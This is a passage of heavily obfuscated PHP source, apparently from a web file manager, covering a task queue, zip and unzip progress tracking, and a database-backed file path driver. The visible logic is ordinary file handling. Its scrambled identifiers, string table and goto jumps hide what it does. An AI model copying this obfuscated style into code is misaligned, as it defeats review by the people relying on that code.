(!$û³Û±œÛ) { return array(); } return $û³Û±œÛ; } public static function setAll($õôÌ­¨¿) { $‡µÊÖæ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($õôÌ­¨¿), $‡µÊÖæ); Cache::set(self::QUEUE_DATA, $õôÌ­¨¿, $‡µÊÖæ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto bÓ™ïã¼³; bÓ™ïã¼³: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($§ç†éİ‹, $±µê×¸ = 5.0) { if (!$§ç†éİ‹) { return; } $›¿«ÙÓ… = Cache::get($§ç†éİ‹); if (!$›¿«ÙÓ… || timeFloat() - floatVal($›¿«ÙÓ…) >= $±µê×¸) { Cache::set($§ç†éİ‹, timeFloat(), $±µê×¸ * 10); return !0; } return !1; } public static function timeLimitCall($“áò¢Ş, $­‚ï¼ÓÕ, $ç‘Ğõ—¾, $âËÚÌ‰Œ = 5.0) { $À—¦Ïû÷ =& $_SERVER[¹òÍ›æş]; if (!$“áò¢Ş || !$­‚ï¼ÓÕ) { return; } self::$asyncAdd = !0; $µßˆıšÓ = $À—¦Ïû÷[1773]; $’ø®œ³ = Cache::get($µßˆıšÓ, !0); $ÉÈ¹ıêÛ = array($À—¦Ïû÷[1774] => timeFloat(), $À—¦Ïû÷[1775] => timeFloat(), $À—¦Ïû÷[302] => $­‚ï¼ÓÕ, $À—¦Ïû÷[1767] => $ç‘Ğõ—¾, $À—¦Ïû÷[190] => $âËÚÌ‰Œ); if (is_array($’ø®œ³[$“áò¢Ş])) { $ÉÈ¹ıêÛ[$À—¦Ïû÷[1775]] = $’ø®œ³[$“áò¢Ş][$À—¦Ïû÷[1775]]; } if (is_array($’ø®œ³[$“áò¢Ş])) { if (timeFloat() - $’ø®œ³[$“áò¢Ş][$À—¦Ïû÷[1774]] < $ÉÈ¹ıêÛ[$À—¦Ïû÷[190]] * 0.3) { return; } $ÉÈ¹ıêÛ[$À—¦Ïû÷[1775]] = $’ø®œ³[$“áò¢Ş][$À—¦Ïû÷[1775]]; } $’ø®œ³[$“áò¢Ş] = $ÉÈ¹ıêÛ; Cache::set($µßˆıšÓ, $’ø®œ³, 60); Cache::removeMemory($µßˆıšÓ); write_log($À—¦Ïû÷[1776] . $“áò¢Ş . $À—¦Ïû÷[81] . $­‚ï¼ÓÕ, $À—¦Ïû÷[1769]); } public static function timeLimitCallLoop() { $õ´ä¸…³ =& $_SERVER[¹òÍ›æş]; $«æş”Ï = array($õ´ä¸…³[1777]); $İş»öƒ¼ = in_array(strtolower(ACTION), $«æş”Ï); if (!$İş»öƒ¼ && !self::$asyncAdd) { return; } $ì„±‹ÃÆ = $õ´ä¸…³[1773]; $şºÌşÃÒ = Cache::get($ì„±‹ÃÆ, !0); if (!$şºÌşÃÒ || count($şºÌşÃÒ) <= 0) { return; } $ƒ´Ö¼åØ = !1; $…ĞÕ¿ÖĞ = timeFloat(); $ôÑ€³ø• = array(); foreach ($şºÌşÃÒ as $áíªÒè => $‹×ú•²Ğ) { if ($…ĞÕ¿ÖĞ - $‹×ú•²Ğ[$õ´ä¸…³[1775]] > $‹×ú•²Ğ[$õ´ä¸…³[190]]) { $ƒ´Ö¼åØ = !0; try { Hook::apply($‹×ú•²Ğ[$õ´ä¸…³[302]], $‹×ú•²Ğ[$õ´ä¸…³[1767]]); write_log($õ´ä¸…³[1778] . $áíªÒè . $õ´ä¸…³[81] . $‹×ú•²Ğ[$õ´ä¸…³[302]] . $õ´ä¸…³[1779] . ACTION, $õ´ä¸…³[1769]); } catch (Exception $ÈÃ…ì¸Ø) { } continue; } $ôÑ€³ø•[$áíªÒè] = $‹×ú•²Ğ; } if (!$ƒ´Ö¼åØ) { return; } if (!$ôÑ€³ø•) { return Cache::remove($ì„±‹ÃÆ); } Cache::set($ì„±‹ÃÆ, $ôÑ€³ø•, 60); Cache::removeMemory($ì„±‹ÃÆ); } public static function finished($î‰¯¯¬®, $İä’Ë ) { $Õø ³Ë¾ =& $_SERVER[¹òÍ›æş]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Õø ³Ë¾[302] => $î‰¯¯¬®, $Õø ³Ë¾[1767] => $İä’Ë ); } private static function finishedRun() { $ùÎÏ©µ =& $_SERVER[¹òÍ›æş]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ïÇ‰ˆ¿) { try { Hook::apply($ïÇ‰ˆ¿[$ùÎÏ©µ[302]], $ïÇ‰ˆ¿[$ùÎÏ©µ[1767]]); } catch (Exception $©®ÛË•) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Î¿éÎú =& $_SERVER[¹òÍ›æş]; parent::startAfter(); Hook::bind($Î¿éÎú[1780], array($this, $Î¿éÎú[1781])); Hook::bind($Î¿éÎú[1220], array($this, $Î¿éÎú[1782])); $ßõÕÆ¡ğ =& $this->task; $ßõÕÆ¡ğ[$Î¿éÎú[1783]] = $Î¿éÎú[1221]; if (!$ßõÕÆ¡ğ[$Î¿éÎú[1569]]) { $ßõÕÆ¡ğ[$Î¿éÎú[1569]] = LNG($Î¿éÎú[1784]); } } protected function endAfter() { $Ï¡è™ÂÒ =& $_SERVER[¹òÍ›æş]; parent::endAfter(); Hook::unbind($Ï¡è™ÂÒ[1780], array($this, $Ï¡è™ÂÒ[1781])); Hook::unbind($Ï¡è™ÂÒ[1220], array($this, $Ï¡è™ÂÒ[1782])); } public function updateAfter() { $ôÒÖÒ¬Å =& $_SERVER[¹òÍ›æş]; $şë•è =& $this->task; if (!$şë•è[$ôÒÖÒ¬Å[816]] || !$şë•è[$ôÒÖÒ¬Å[793]]) { return; } if ($şë•è[$ôÒÖÒ¬Å[1783]] == $ôÒÖÒ¬Å[1221]) { $ÇäÌ®‹ƒ = 0; if ($şë•è[$ôÒÖÒ¬Å[1722]]) { $ÇäÌ®‹ƒ = $şë•è[$ôÒÖÒ¬Å[1723]] / $şë•è[$ôÒÖÒ¬Å[1722]]; } $şë•è[$ôÒÖÒ¬Å[1671]] = $ÇäÌ®‹ƒ * 0.3; } else { if ($şë•è[$ôÒÖÒ¬Å[1783]] == $ôÒÖÒ¬Å[351]) { $ÇäÌ®‹ƒ = $şë•è[$ôÒÖÒ¬Å[1670]] / $şë•è[$ôÒÖÒ¬Å[816]]; $şë•è[$ôÒÖÒ¬Å[1671]] = 0.3 + $ÇäÌ®‹ƒ * 0.4; } else { if ($şë•è[$ôÒÖÒ¬Å[1783]] == $ôÒÖÒ¬Å[117]) { $íœ¥¬´Å = 0; if ($şë•è[$ôÒÖÒ¬Å[1724]] == $ôÒÖÒ¬Å[117]) { $íœ¥¬´Å = $şë•è[$ôÒÖÒ¬Å[1723]]; } $ÇäÌ®‹ƒ = ($şë•è[$ôÒÖÒ¬Å[1727]] + $íœ¥¬´Å) / $şë•è[$ôÒÖÒ¬Å[793]]; $şë•è[$ôÒÖÒ¬Å[1671]] = 0.3 + 0.4 + $ÇäÌ®‹ƒ * 0.3; } } } if ($şë•è[$ôÒÖÒ¬Å[1671]] > 0) { $£§æ«ß = timeFloat() - $şë•è[$ôÒÖÒ¬Å[1673]] - $şë•è[$ôÒÖÒ¬Å[1676]]; $şë•è[$ôÒÖÒ¬Å[1677]] = $£§æ«ß * (1 - $şë•è[$ôÒÖÒ¬Å[1671]]) / $şë•è[$ôÒÖÒ¬Å[1671]]; } } public function addFile($ôùíÂ–‘) { $×áÛè³º =& $_SERVER[¹òÍ›æş]; $ªâÎáàÄ =& $this->task; $‹ŞïÖ¨¬ = IO::info($ôùíÂ–‘); $ªâÎáàÄ[$×áÛè³º[1720]] = $‹ŞïÖ¨¬[$×áÛè³º[32]]; $ªâÎáàÄ[$×áÛè³º[1722]] = $‹ŞïÖ¨¬[$×áÛè³º[86]]; $ªâÎáàÄ[$×áÛè³º[1723]] = 0; $ªâÎáàÄ[$×áÛè³º[1091]] = $×áÛè³º[1743]; $ªâÎáàÄ[$×áÛè³º[1724]] = $×áÛè³º[1221]; $ªâÎáàÄ[$×áÛè³º[793]] = $‹ŞïÖ¨¬[$×áÛè³º[86]]; $ªâÎáàÄ[$×áÛè³º[816]] = 1; $¥…¼îªå = 0; $ªâÎáàÄ[$×áÛè³º[1731]] = array($×áÛè³º[1732] => $¥…¼îªå + 1, $×áÛè³º[458] => $‹ŞïÖ¨¬[$×áÛè³º[32]], $×áÛè³º[94] => $‹ŞïÖ¨¬[$×áÛè³º[94]], $×áÛè³º[547] => $‹ŞïÖ¨¬[$×áÛè³º[547]] ? $‹ŞïÖ¨¬[$×áÛè³º[547]] : $‹ŞïÖ¨¬[$×áÛè³º[94]]); $this->update(); } public function unzipAfter($Áıƒ˜ßº) { $•¶ş¤• =& $_SERVER[¹òÍ›æş]; $§Ş¡ÆÁÀ =& $this->task; $§Ş¡ÆÁÀ[$•¶ş¤•[1783]] = $•¶ş¤•[117]; $µİîÌÆ² = IO::infoWithChildren($Áıƒ˜ßº); $’ÑØÓİ = 0; $§Ş¡ÆÁÀ[$•¶ş¤•[1731]] = array($•¶ş¤•[1732] => $’ÑØÓİ + 1, $•¶ş¤•[458] => $µİîÌÆ²[$•¶ş¤•[32]], $•¶ş¤•[94] => $µİîÌÆ²[$•¶ş¤•[94]], $•¶ş¤•[547] => $µİîÌÆ²[$•¶ş¤•[547]] ? $µİîÌÆ²[$•¶ş¤•[547]] : $µİîÌÆ²[$•¶ş¤•[94]]); if ($µİîÌÆ²[$•¶ş¤•[33]] == $•¶ş¤•[210]) { $§Ş¡ÆÁÀ[$•¶ş¤•[816]] = 1; } else { $§Ş¡ÆÁÀ[$•¶ş¤•[816]] = $µİîÌÆ²[$•¶ş¤•[89]][$•¶ş¤•[87]]; } $§Ş¡ÆÁÀ[$•¶ş¤•[1091]] = $•¶ş¤•[12]; $§Ş¡ÆÁÀ[$•¶ş¤•[1724]] = 0; $§Ş¡ÆÁÀ[$•¶ş¤•[1670]] = 0; $§Ş¡ÆÁÀ[$•¶ş¤•[1722]] = 0; $§Ş¡ÆÁÀ[$•¶ş¤•[1723]] = 0; $§Ş¡ÆÁÀ[$•¶ş¤•[1720]] = $•¶ş¤•[12]; $§Ş¡ÆÁÀ[$•¶ş¤•[1727]] = 0; $§Ş¡ÆÁÀ[$•¶ş¤•[793]] = $µİîÌÆ²[$•¶ş¤•[86]]; $this->update(); self::log($•¶ş¤•[1785] . json_encode(array($§Ş¡ÆÁÀ, $µİîÌÆ²))); } public function nameParse($½‘å—»¸) { $¨úÍµõ =& $_SERVER[¹òÍ›æş]; $‰¤ê¶„ =& $this->task; if ($‰¤ê¶„[$¨úÍµõ[1783]] == $¨úÍµõ[1221]) { $‰¤ê¶„[$¨úÍµõ[1783]] = $¨úÍµõ[351]; $‰¤ê¶„[$¨úÍµõ[1727]] = 0; $‰¤ê¶„[$¨úÍµõ[793]] = 0; } $™—•ëÙÜ = get_path_this($½‘å—»¸); if (strstr($™—•ëÙÜ, $¨úÍµõ[10])) { $‰¤ê¶„[$¨úÍµõ[1670]] += 1; $‰¤ê¶„[$¨úÍµõ[816]] += 1; } $‰¤ê¶„[$¨úÍµõ[1720]] = $½‘å—»¸; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ÿ®¾õ«á =& $_SERVER[¹òÍ›æş]; parent::startAfter(); Hook::bind($Ÿ®¾õ«á[1786], array($this, $Ÿ®¾õ«á[1781])); $äƒ»„½± =& $this->task; $äƒ»„½±[$Ÿ®¾õ«á[1783]] = $Ÿ®¾õ«á[1221]; if (!$äƒ»„½±[$Ÿ®¾õ«á[1569]]) { $äƒ»„½±[$Ÿ®¾õ«á[1569]] = LNG($Ÿ®¾õ«á[1787]); } } protected function endAfter() { $ñÄÍƒõ³ =& $_SERVER[¹òÍ›æş]; parent::endAfter(); Hook::unbind($ñÄÍƒõ³[1786], array($this, $ñÄÍƒõ³[1781])); } public function updateAfter() { $ü€¥ß † =& $_SERVER[¹òÍ›æş]; $İğ‹˜á© =& $this->task; if (!$İğ‹˜á©[$ü€¥ß †[816]] || !$İğ‹˜á©[$ü€¥ß †[793]]) { return; } if ($İğ‹˜á©[$ü€¥ß †[1783]] == $ü€¥ß †[1221]) { $¬àÍ†— = $İğ‹˜á©[$ü€¥ß †[1723]]; if ($İğ‹˜á©[$ü€¥ß †[1724]] != $ü€¥ß †[1221]) { $¬àÍ†— = 0; } $¤ëíÓ¢ = ($İğ‹˜á©[$ü€¥ß †[1727]] + $¬àÍ†—) / $İğ‹˜á©[$ü€¥ß †[793]]; $İğ‹˜á©[$ü€¥ß †[1671]] = $¤ëíÓ¢ * 0.3; } else { if ($İğ‹˜á©[$ü€¥ß †[1783]] == $ü€¥ß †[351]) { $¤ëíÓ¢ = $İğ‹˜á©[$ü€¥ß †[1670]] / $İğ‹˜á©[$ü€¥ß †[816]]; $İğ‹˜á©[$ü€¥ß †[1671]] = 0.3 + $¤ëíÓ¢ * 0.5; } else { if ($İğ‹˜á©[$ü€¥ß †[1783]] == $ü€¥ß †[117]) { $¤ëíÓ¢ = 0; if ($İğ‹˜á©[$ü€¥ß †[1722]]) { $¤ëíÓ¢ = $İğ‹˜á©[$ü€¥ß †[1723]] / $İğ‹˜á©[$ü€¥ß †[1722]]; } $İğ‹˜á©[$ü€¥ß †[1671]] = 0.3 + 0.5 + $¤ëíÓ¢ * 0.2; } } } if ($İğ‹˜á©[$ü€¥ß †[1671]] > 0) { $º”µªÇ = timeFloat() - $İğ‹˜á©[$ü€¥ß †[1673]] - $İğ‹˜á©[$ü€¥ß †[1676]]; $İğ‹˜á©[$ü€¥ß †[1677]] = $º”µªÇ * (1 - $İğ‹˜á©[$ü€¥ß †[1671]]) / $İğ‹˜á©[$ü€¥ß †[1671]]; } } public function copyFileStart($¬ ÌÀÚ, $°û¦ÌÁ”, $—Ò¡£ØŞ, $­©úàïò, $½¿Çñ¢¢, $Çì´ƒÇÂ) { $ÜØ‰û»Ş =& $_SERVER[¹òÍ›æş]; parent::copyFileStart($¬ ÌÀÚ, $°û¦ÌÁ”, $—Ò¡£ØŞ, $­©úàïò, $½¿Çñ¢¢, $Çì´ƒÇÂ); $¦ÙÍ€êÂ =& $this->task; if ($¦ÙÍ€êÂ[$ÜØ‰û»Ş[1783]] == $ÜØ‰û»Ş[351]) { $¦ÙÍ€êÂ[$ÜØ‰û»Ş[1783]] = $ÜØ‰û»Ş[117]; } $this->update(); } public function copyFileEnd($Ê®Í‘¹¼, $˜ÔÊ›œ¸, $–¤Âış³, $É²§òøˆ, $¾ê““´, $ÅÓÅ®†) { $ûËÅ£½“ =& $_SERVER[¹òÍ›æş]; $££ÍÎÉ =& $this->task; $££ÍÎÉ[$ûËÅ£½“[1723]] = $££ÍÎÉ[$ûËÅ£½“[1722]]; $££ÍÎÉ[$ûËÅ£½“[1727]] += $££ÍÎÉ[$ûËÅ£½“[1722]]; $££ÍÎÉ[$ûËÅ£½“[1724]] = $ûËÅ£½“[12]; $this->update(); } public function nameParse($©ÑäØ) { $°ˆìŠüÄ =& $_SERVER[¹òÍ›æş]; $Û›åêî =& $this->task; if ($Û›åêî[$°ˆìŠüÄ[1670]] < $Û›åêî[$°ˆìŠüÄ[816]]) { $Ù×Â‰à = get_path_this($©ÑäØ); if (strstr($Ù×Â‰à, $°ˆìŠüÄ[10])) { $Û›åêî[$°ˆìŠüÄ[1670]] += 1; } } if ($Û›åêî[$°ˆìŠüÄ[1783]] == $°ˆìŠüÄ[1221]) { $Û›åêî[$°ˆìŠüÄ[1783]] = $°ˆìŠüÄ[351]; } $Û›åêî[$°ˆìŠüÄ[1720]] = $©ÑäØ; $this->update(); } } goto f™—è´öÖù; a“ì„•³Ÿ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ìÇÛÏ) { $this->pathParse = $ìÇÛÏ; $this->model = Model($_SERVER[¹òÍ›æş][1360]); } public function getPath($»®øíïº) { return trim($»®øíïº, $_SERVER[¹òÍ›æş][8]); } public function pathFather($íá¤äÌ¯) { $ë„İŸ¿± = $this->parse($íá¤äÌ¯); $ë„İŸ¿± = $this->infoSimple($íá¤äÌ¯); return $ë„İŸ¿± ? $ë„İŸ¿±[$_SERVER[¹òÍ›æş][470]] : !1; } public function pathThis($²ó‡Ò…) { $ºı³ƒ„Ü = $this->infoSimple($²ó‡Ò…); return $ºı³ƒ„Ü ? $ºı³ƒ„Ü[$_SERVER[¹òÍ›æş][32]] : !1; } public function getPathOuter($›½ö˜”é) { if (!$›½ö˜”é) { return $›½ö˜”é; } $¨í‡òÖˆ = $this->parse($›½ö˜”é); return KodIO::make($¨í‡òÖˆ[$_SERVER[¹òÍ›æş][437]]); } public function copyFolderFromIO($œØ–Ÿ¿÷, $¡Áå¯ÔÁ, $©­µ”Óì, $ÍŞóá’Ø, $«ÑĞø§…) { $Â¼™àö÷ = $this->model->copyFolderFromIO($œØ–Ÿ¿÷, $¡Áå¯ÔÁ, $©­µ”Óì, $ÍŞóá’Ø, $«ÑĞø§…); return KodIO::make($Â¼™àö÷); } public function isParentOf($®Æ×ÀóÖ, $öüÃ±İ‘) { return $this->model->isParentOf($®Æ×ÀóÖ, $öüÃ±İ‘); } public function mkfile($ÅÆâêŞÅ, $‡Â§ìÚ = '', $è“ö´ø˜ = REPEAT_RENAME) { $Ô²€±¤ =& $_SERVER[¹òÍ›æş]; $Çè˜—–” = $this->parse($ÅÆâêŞÅ); $ÅÆâêŞÅ = $Çè˜—–”[$Ô²€±¤[437]]; for ($õƒÜø = 0; $õƒÜø < count($Çè˜—–”[$Ô²€±¤[1361]]); $õƒÜø++) { $áã®·¿“ = $Çè˜—–”[$Ô²€±¤[1361]][$õƒÜø]; if ($õƒÜø == count($Çè˜—–”[$Ô²€±¤[1361]]) - 1) { $ÅÆâêŞÅ = $this->model->mkfile($ÅÆâêŞÅ, $áã®·¿“, $‡Â§ìÚ, $è“ö´ø˜); break; } $ÅÆâêŞÅ = $this->model->mkdir($ÅÆâêŞÅ, $áã®·¿“, REPEAT_SKIP); } return $this->getPathOuter($ÅÆâêŞÅ); } public function mkdir($½ñ¨£†, $•±ÂÀ³Î = REPEAT_SKIP) { $Éò•£¬“ =& $_SERVER[¹òÍ›æş]; $êŸ³¯ìê = $this->parse($½ñ¨£†); $½ñ¨£† = $êŸ³¯ìê[$Éò•£¬“[437]]; for ($Úœ•´Ğü = 0; $Úœ•´Ğü < count($êŸ³¯ìê[$Éò•£¬“[1361]]); $Úœ•´Ğü++) { $ÏÊî˜­ = $êŸ³¯ìê[$Éò•£¬“[1361]][$Úœ•´Ğü]; $½ñ¨£† = $this->model->mkdir($½ñ¨£†, $ÏÊî˜­, $•±ÂÀ³Î); } return $this->getPathOuter($½ñ¨£†); } public function copyFile($Ü°¬øˆ¡, $è£ìÍÏÙ, $ñÎŒêÄ¦ = REPEAT_REPLACE) { $íŸ±º–‚ =& $_SERVER[¹òÍ›æş]; $ğı÷Ûı = $this->parse($è£ìÍÏÙ); $®ò™‚îÈ = $this->model->copy($Ü°¬øˆ¡, $ğı÷Ûı[$íŸ±º–‚[437]], $ñÎŒêÄ¦, $ğı÷Ûı[$íŸ±º–‚[94]]); return $®ò™‚îÈ ? $this->getPathOuter($®ò™‚îÈ) : !1; } public function moveFile($Ğ¶ßÕÒà, $úŠûÛæî, $¸·ù¶Æ = REPEAT_REPLACE) { $÷½Âı‡€ =& $_SERVER[¹òÍ›æş]; $£êÍ•‹ = $this->parse($úŠûÛæî); $¹êËªü = $this->model->move($Ğ¶ßÕÒà, $£êÍ•‹[$÷½Âı‡€[437]], $¸·ù¶Æ, $£êÍ•‹[$÷½Âı‡€[94]]); return $¹êËªü ? $this->getPathOuter($¹êËªü) : !1; } public function copy($Ûª³»Ñƒ, $ù©¶°Œ™, $È´ÆŒÍ› = REPEAT_REPLACE, $İ±Ÿ£®Ë = false) { $Ñ¦úÚ÷ = $this->parse($ù©¶°Œ™); $àÉ„‚Ò = $this->model->copy($Ûª³»Ñƒ, $Ñ¦úÚ÷[$_SERVER[¹òÍ›æş][437]], $È´ÆŒÍ›, $İ±Ÿ£®Ë); return $àÉ„‚Ò ? $this->getPathOuter($àÉ„‚Ò) : !1; } public function moveSameAllow() { } public function move($â•ÌĞŸÑ, $÷¼¨óŞ, $²Á¥¨å = REPEAT_REPLACE, $áéª£æ = false) { $µäŞÛÎÆ = $this->parse($÷¼¨óŞ); $ü–éËÈğ = $this->model->move($â•ÌĞŸÑ, $µäŞÛÎÆ[$_SERVER[¹òÍ›æş][437]], $²Á¥¨å, $áéª£æ); return $ü–éËÈğ ? $this->getPathOuter($ü–éËÈğ) : !1; } public function remove($ÄÏ°šÆ, $É¾‡€§Ü = true) { return $this->model->remove($ÄÏ°šÆ, $É¾‡€§Ü); } public function rename($ò‰¸Ê°, $¹Ø“¦½Ó) { $ÑôæòÀ = $this->model->rename($ò‰¸Ê°, $¹Ø“¦½Ó); return $ÑôæòÀ ? $this->getPathOuter($ò‰¸Ê°) : $ÑôæòÀ; } public function size($æ ‡àæõ) { $¥±íÂµ = $this->infoSimple($æ ‡àæõ); return $¥±íÂµ ? $¥±íÂµ[$_SERVER[¹òÍ›æş][86]] : 0; } public function infoSimple($¶òÈº‰×) { return $this->model->sourceInfo($¶òÈº‰×); } public function info($ÃÛ¦”°Î) { return $this->infoParse($ÃÛ¦”°Î); } public function infoAuth($úÌœÒ‘š) { return $this->infoParse($úÌœÒ‘š, !1, !0); } public function infoWithChildren($¾Å‰áì£) { return $this->infoParse($¾Å‰áì£, !0); } protected function infoParse($‚Üİàó, $ª‚£¤¾ = false, $«á§øÙÔ = false) { if (!$ª‚£¤¾) { return $this->model->pathInfo($‚Üİàó, $«á§øÙÔ); } return $this->model->pathInfoMore($‚Üİàó); } public function infoFull($ÀŸÆÏ) { $ıÁçå ² =& $_SERVER[¹òÍ›æş]; $­‡º¬¹¢ = explode($ıÁçå ²[8], $ÀŸÆÏ); $Éˆ‰Ïî  = implode($ıÁçå ²[8], array_splice($­‡º¬¹¢, 1)); return $this->model->pathInfoByPath($­‡º¬¹¢[0], $Éˆ‰Ïî ); } public function hashSimple($ò‡ó˜ª´) { $¬£Ğ¯ªŒ =& $_SERVER[¹òÍ›æş]; $ŒÚÈğ¶ = $this->infoWithChildren($ò‡ó˜ª´); return $ŒÚÈğ¶[$¬£Ğ¯ªŒ[180]][$¬£Ğ¯ªŒ[187]]; } public function hashMd5($ø¾¡Âş) { $Ôî«Òó =& $_SERVER[¹òÍ›æş]; $»‡…ÜÈ¼ = $this->infoWithChildren($ø¾¡Âş); return $»‡…ÜÈ¼[$Ôî«Òó[180]][$Ôî«Òó[186]]; } public function exist($ä›Üï®ˆ) { $À©Ë©‹ =& $_SERVER[¹òÍ›æş]; $ò”ï©Ë = $this->parse($ä›Üï®ˆ); if (!$ò”ï©Ë[$À©Ë©‹[94]]) { return $this->isFile($ä›Üï®ˆ) || $this->isFolder($ä›Üï®ˆ); } $¥ı²Ö®Ù = array($À©Ë©‹[439] => $ò”ï©Ë[$À©Ë©‹[437]], $À©Ë©‹[32] => $ò”ï©Ë[$À©Ë©‹[94]]); $£İÊŞÄâ = $this->model->where($¥ı²Ö®Ù)->find(); return $£İÊŞÄâ ? !0 : !1; } public function isFile($ˆÙ¨Ó—ó) { $ø­‡Ê´ä =& $_SERVER[¹òÍ›æş]; $µƒä— = $this->infoSimple($ˆÙ¨Ó—ó); return $µƒä— && $µƒä—[$ø­‡Ê´ä[448]] == $ø­‡Ê´ä[98] ? !1 : !0; } public function isFolder($´Óæ„¹Æ) { $ãó’§¨ =& $_SERVER[¹òÍ›æş]; $¤§»€µ = $this->infoSimple($´Óæ„¹Æ); return $¤§»€µ && $¤§»€µ[$ãó’§¨[448]] == $ãó’§¨[98] ? !0 : !1; } public function listPath($Ë§äòí­, $İ»äóİ× = false) { $à¡ÓîÚ =& $_SERVER[¹òÍ›æş]; if ($Ë§äòí­ == $à¡ÓîÚ[12]) { return !1; } $¼Ö¸îí° = array($à¡ÓîÚ[439] => $Ë§äòí­); if ($İ»äóİ×) { return $this->model->listSource($¼Ö¸îí°, -1); } return $this->model->listSource($¼Ö¸îí°); } public function has($äôÀÌÓ, $“šÍ“Ô¨ = false, $¼¹…¦ = null) { $Š¨üş«Ë =& $_SERVER[¹òÍ›æş]; $ì„€ı­ = $this->infoWithChildren($äôÀÌÓ); if ($“šÍ“Ô¨) { return array($Š¨üş«Ë[218] => $ì„€ı­[$Š¨üş«Ë[218]], $Š¨üş«Ë[217] => $ì„€ı­[$Š¨üş«Ë[217]]); } return $¼¹…¦ ? $ì„€ı­[$Š¨üş«Ë[218]] : $ì„€ı­[$Š¨üş«Ë[217]]; } public function listAll($†Õ¯òò‹) { $†ù…¨Œ = IO::info($this->pathParse[$_SERVER[¹òÍ›æş][94]]); if (!$†ù…¨Œ) { return array(); } return $this->model->listAll($†Õ¯òò‹); } public function getContent($ôû»Üèî) { return $this->model->getContent($ôû»Üèî); } public function setContent($´ùÃ¶–ñ, $¹©×‘Î… = '') { return $this->model->setContent($´ùÃ¶–ñ, $¹©×‘Î…); } public function fileSubstr($Ø—½™³Û, $ºâÂøˆÜ, $‰àßĞõÒ) { return $this->model->fileSubstr($Ø—½™³Û, $ºâÂøˆÜ, $‰àßĞõÒ); } public function download($®™ÆÍŒé, $’Æ·ŞŞô = '') { $´ƒ—ÆÖ¬ = get_path_father($’Æ·ŞŞô); $½êâËöÃ = get_path_this($’Æ·ŞŞô); $»Ÿé®¥ù = $this->model->fileInfoGet($®™ÆÍŒé); $Á„äùÅó = IO::copy($»Ÿé®¥ù[$_SERVER[¹òÍ›æş][94]], $´ƒ—ÆÖ¬, !1, $½êâËöÃ); return $Á„äùÅó; } public function setModifyTime($»ß‘”, $Ú·İÂÈ = '') { $ÌñÂ™Ò =& $_SERVER[¹òÍ›æş]; if (!$»ß‘”) { return; } $this->model->where(array($ÌñÂ™Ò[455] => $»ß‘”))->save(array($ÌñÂ™Ò[95] => $Ú·İÂÈ)); } public function upload($ìğ¬ıÔ, $ìŠÀªàÎ, $µ†¸— = false, $Ÿœ†äâ = REPEAT_REPLACE) { $òùÊúç· =& $_SERVER[¹òÍ›æş]; $¯ˆ•°µÍ = $this->parse($ìğ¬ıÔ); $Ø¢“À»° = $this->model->addFile($¯ˆ•°µÍ[$òùÊúç·[437]], $ìŠÀªàÎ, $¯ˆ•°µÍ[$òùÊúç·[94]], $µ†¸—, $Ÿœ†äâ); return $this->getPathOuter($Ø¢“À»°); } public function uploadFileByID($˜¢Äâ­ï, $â­µˆ€ø, $Ç½©³ä•) { $¾¨ã²ğÛ =& $_SERVER[¹òÍ›æş]; $¤úØ‹Ğ® = $this->parse($˜¢Äâ­ï); $˜—ÁÄÁ½ = $this->model->addFileByFileID($¤úØ‹Ğ®[$¾¨ã²ğÛ[437]], $â­µˆ€ø, $¤úØ‹Ğ®[$¾¨ã²ğÛ[94]], $Ç½©³ä•); return $this->getPathOuter($˜—ÁÄÁ½); } public function addFileByRemote($ã”“óŠ­, $˜©£†ë’, $¤íÏ‡òğ = array(), $ô‰ãµ€¸ = '', $ä†À¹É) { $ëÀÏ¡ñê =& $_SERVER[¹òÍ›æş]; $ïïéØêÑ = $this->parse($ã”“óŠ­); $ô‰ãµ€¸ = empty($ô‰ãµ€¸) ? $ïïéØêÑ[$ëÀÏ¡ñê[94]] : $ô‰ãµ€¸; $´ÒÖûìÂ = $this->model->addFileByRemote($ïïéØêÑ[$ëÀÏ¡ñê[437]], $˜©£†ë’, $ô‰ãµ€¸, $¤íÏ‡òğ, $ä†À¹É); return $this->getPathOuter($´ÒÖûìÂ); } public function uploadLink($¹»‹ÉÏğ, $§òÎ€¾‚ = 0) { $®‚»¸ƒË =& $_SERVER[¹òÍ›æş]; $ºğƒèºÂ = $this->parse($¹»‹ÉÏğ); $å½îôÉÚ = _get($GLOBALS[$®‚»¸ƒË[7]], $®‚»¸ƒË[1362]); $•Ó•ª•÷ = _get($GLOBALS[$®‚»¸ƒË[7]], $®‚»¸ƒË[1363]); $¹»‹ÉÏğ = Model($®‚»¸ƒË[639])->createFileName($ºğƒèºÂ[$®‚»¸ƒË[94]], $å½îôÉÚ, $•Ó•ª•÷); return IO::uploadLink($¹»‹ÉÏğ, $§òÎ€¾‚); } public function fileNameAuto($şšæ´•³, $¤ıøÊ‚¦, $æûÉƒÅ¡ = REPEAT_REPLACE, $Òç¿ëâ¿ = false) { return $this->model->fileNameAuto($şšæ´•³, $¤ıøÊ‚¦, $æûÉƒÅ¡, $Òç¿ëâ¿); } public function fileNameExist($™–ü­’±, $îŒ©ø‚â) { return $this->model->fileNameExist($™–ü­’±, $îŒ©ø‚â); } protected function _fileOut($ûÔ÷í•ï, $İ£ŸÛÛõ = false, $‘ë’Àó’ = false, $’Æ…Ğä‰ = '', $²Ô§ÆÓâ = false) { $ø¸× ËÏ =& $_SERVER[¹òÍ›æş]; $ÕúµÖØØ = $this->model->sourceInfo($ûÔ÷í•ï); if ($ÕúµÖØØ[$ø¸× ËÏ[448]] == $ø¸× ËÏ[98]) { header($ø¸× ËÏ[1364]); die; } $éò–ˆºï = $this->model->fileInfoGet($ûÔ÷í•ï); $’Æ…Ğä‰ = $éò–ˆºï[$ø¸× ËÏ[186]] ? $éò–ˆºï[$ø¸× ËÏ[186]] : $’Æ…Ğä‰; $¨œ°Î¿ = isset($GLOBALS[$ø¸× ËÏ[1365]]) ? $GLOBALS[$ø¸× ËÏ[1365]] : $ÕúµÖØØ[$ø¸× ËÏ[32]]; if ($²Ô§ÆÓâ) { return 